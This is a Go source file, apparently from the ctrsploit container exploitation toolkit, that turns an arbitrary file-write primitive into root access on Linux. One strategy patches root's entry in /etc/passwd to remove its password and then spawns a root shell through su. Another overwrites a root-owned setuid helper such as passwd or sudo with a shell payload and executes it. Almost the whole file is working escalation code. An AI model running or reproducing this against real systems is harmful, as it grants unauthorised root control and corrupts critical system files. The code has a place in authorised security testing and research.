package pipeprimitive

import (
	"errors"
	"fmt"
	"io"
	"os"
	"os/exec"
	"runtime"
	"strings"

	"github.com/ctrsploit/ctrsploit/pkg/util"
)

var passwdPath = "/etc/passwd"

var suidHelperCandidates = []string{
	"/usr/bin/chfn",
	"/usr/bin/chsh",
	"/usr/bin/gpasswd",
	"/usr/bin/mount",
	"/usr/bin/newgrp",
	"/usr/bin/passwd",
	"/usr/bin/sudo",
	"/usr/bin/umount",
	"/bin/mount",
	"/bin/ping",
	"/bin/su",
	"/bin/umount",
}

func Escalate(primitive Primitive) error {
	return EscalateWithIO(primitive, os.Stdin, os.Stdout, os.Stderr)
}

func EscalateWithIO(primitive Primitive, stdin io.Reader, stdout, stderr io.Writer) error {
	stdin, stdout, stderr = normalizeShellIO(stdin, stdout, stderr)
	return escalateWithStrategies(primitive, defaultEscalateStrategies(stdin, stdout, stderr))
}

type escalateStrategy struct {
	name string
	run  func(Primitive) error
}

func defaultEscalateStrategies(stdin io.Reader, stdout, stderr io.Writer) []escalateStrategy {
	return []escalateStrategy{
		{name: "passwd-su", run: func(primitive Primitive) error {
			return escalateByPasswdAndSu(primitive, stdin, stdout, stderr)
		}},
		{name: "suid-overwrite", run: func(primitive Primitive) error {
			return escalateBySuidOverwrite(primitive, stdin, stdout, stderr)
		}},
	}
}

func escalateWithStrategies(primitive Primitive, strategies []escalateStrategy) error {
	if len(strategies) == 0 {
		return fmt.Errorf("%s privilege escalate: no escalation strategies configured", primitive.GetExpName())
	}

	var failures []string
	for _, strategy := range strategies {
		if err := strategy.run(primitive); err != nil {
			failures = append(failures, fmt.Sprintf("%s failed: %v", strategy.name, err))
			continue
		}
		return nil
	}
	return fmt.Errorf("%s privilege escalate: all strategies failed: %s", primitive.GetExpName(), strings.Join(failures, "; "))
}

func escalateByPasswdAndSu(primitive Primitive, stdin io.Reader, stdout, stderr io.Writer) error {
	return escalateWithShellInvoker(primitive, util.CheckRootShellBySu, func() error {
		return util.InvokeRootShell(stdin, stdout, stderr)
	})
}

func escalateWithShellInvoker(primitive Primitive, checkShell, invokeShell func() error) error {
	if err := checkShell(); err != nil {
		return fmt.Errorf(
			"no usable su-compatible root shell before patching %s: %w",
			passwdPath, err,
		)
	}

	offset, err := rootPasswdPasswordOffset(passwdPath)
	if err != nil {
		return fmt.Errorf("find root password offset in %s: %w", passwdPath, err)
	}

	payload := []byte(":0:0:root:/root:/bin/bash\n")
	if err := primitive.Write(passwdPath, int64(offset), payload); err != nil {
		return fmt.Errorf(
			"%s privilege escalate: write %s at offset %d with %d bytes: %w",
			primitive.GetExpName(), passwdPath, offset, len(payload), err,
		)
	}

	if err := invokeShell(); err != nil {
		return fmt.Errorf(
			"%s was patched, but invoking a su-compatible root shell failed: %w",
			passwdPath, err,
		)
	}
	return nil
}

func escalateBySuidOverwrite(primitive Primitive, stdin io.Reader, stdout, stderr io.Writer) error {
	payload, err := suidShellPayload()
	if err != nil {
		return err
	}
	if primitive.MinOffset() != 0 {
		return fmt.Errorf("primitive min offset %d cannot overwrite an executable ELF header", primitive.MinOffset())
	}
	if err := util.CheckSetuidExecutionAllowed(); err != nil {
		return err
	}

	target, err := selectSuidOverwriteTarget(suidHelperCandidates, len(payload))
	if err != nil {
		return err
	}
	if err := primitive.Write(target, 0, payload); err != nil {
		return fmt.Errorf("overwrite suid helper %s with root shell payload: %w", target, err)
	}
	if err := invokeSuidShellTarget(target, stdin, stdout, stderr); err != nil {
		return fmt.Errorf("invoke overwritten suid helper %s: %w", target, err)
	}
	return nil
}

func suidShellPayload() ([]byte, error) {
	if runtime.GOOS != "linux" || runtime.GOARCH != "amd64" {
		return nil, fmt.Errorf("suid overwrite payload unsupported on %s/%s", runtime.GOOS, runtime.GOARCH)
	}
	if len(suidShellPayloadAMD64) == 0 {
		return nil, errors.New("empty suid overwrite payload")
	}
	return suidShellPayloadAMD64, nil
}

func invokeSuidShellTarget(path string, stdin io.Reader, stdout, stderr io.Writer) error {
	cmd := exec.Command(path)
	cmd.Stdin = stdin
	cmd.Stdout = stdout
	cmd.Stderr = stderr
	return cmd.Run()
}

func normalizeShellIO(stdin io.Reader, stdout, stderr io.Writer) (io.Reader, io.Writer, io.Writer) {
	if stdin == nil {
		stdin = os.Stdin
	}
	if stdout == nil {
		stdout = os.Stdout
	}
	if stderr == nil {
		stderr = os.Stderr
	}
	return stdin, stdout, stderr
}

func selectSuidOverwriteTarget(candidates []string, payloadLength int) (string, error) {
	if payloadLength <= 0 {
		return "", fmt.Errorf("invalid payload length %d", payloadLength)
	}

	var failures []string
	for _, candidate := range candidates {
		if err := util.CheckRootOwnedSetuidExecutable(candidate); err != nil {
			failures = append(failures, fmt.Sprintf("%s unusable: %v", candidate, err))
			continue
		}
		info, err := os.Stat(candidate)
		if err != nil {
			failures = append(failures, fmt.Sprintf("%s unavailable: %v", candidate, err))
			continue
		}
		if info.Size() < int64(payloadLength) {
			failures = append(failures, fmt.Sprintf("%s too small: size %d < payload %d", candidate, info.Size(), payloadLength))
			continue
		}
		return candidate, nil
	}
	return "", fmt.Errorf("no usable root-owned suid helper for overwrite: %s", strings.Join(failures, "; "))
}
